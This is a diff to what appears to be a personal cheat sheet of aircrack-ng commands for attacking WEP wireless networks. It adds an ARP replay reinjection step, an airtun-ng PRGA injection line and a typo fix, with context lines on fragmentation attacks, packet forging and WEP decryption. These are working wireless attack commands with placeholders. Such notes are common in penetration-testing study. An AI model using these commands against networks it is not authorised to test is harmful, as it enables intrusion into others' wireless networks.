@@ -280,13 +280,16 @@ aireplay-ng -5 -b $AP_MAC -h $ATK_MAC $WI_INTF #actual Frag attack
 #results in fragment-####-#####.xor file (PRGA file)
 
 --Note PRGA stream required (gathered above)
-packetforge-ng -0 -a $AP_MAC -h $ATK_MAC -l 255.255.255.255 -k 255.255.255.255 -y [PRGA FILE(IN).xor] -w [OUT File]
+packetforge-ng -0 -a $AP_MAC -h $ATK_MAC -l 255.255.255.255 -k 255.255.255.255 -y [PRGA FILE(IN).xor] -w [OUT FILE.CAP]
 # -0 ARP packet
 # -l Source Address  Current IP Address of Attack Machine (Maybe)
 # -k Destination Address can be the broadcast e.g. 192.168.1.255
 # Out file example name injectable.cap
 tcpdump -n -vvv -e s0 -r [CAPTURE FILE ] #Check health of file.
 # -vvv extra verbosity
+
+--After PRGA is captured in frag or chop chop, and manipulated into a .cap with packetforge, reinject it
+aireplay-ng -2 -r [OUT FIlE.CAP] $WI_INTF
 
 #second method to check the injectible.cap
 airdecap -e $ESSID -w [WEP KEY] [CAPTURE FILE]
@@ -401,13 +404,16 @@ airmon-ng start wlan0 3 #monitor mode on channel 3
 airserv-ng -p [PORT] -c $AP_CH -d $WI_INTF
 # -p set port
 # -d daemon mode
-airodump-gn -c $AP_CH --bssid $AP_MAC [IP]:[PORT] #replaces mon0 with TCP PORT
+airodump-ng -c $AP_CH --bssid $AP_MAC [IP]:[PORT] #replaces mon0 with TCP PORT
 
 --airtun-ng
 #useful for wireless intrustion detection system
 airmon-ng start wlan0 3 #monitor mode on channel 3
 airtun-ng -a $AP_MAC -w [WEP KEY] $WI_INTF #creates new interface AT0
 ifconfig at0 up # bring up new interface, now wireshark can receive decrypted packets
+
+--airtun PRGA injection
+airtun-ng -a $AP_MAC -y [PRGA File] $WI_INTF
 
 --airgraph-ng
 #Clients and Access Points
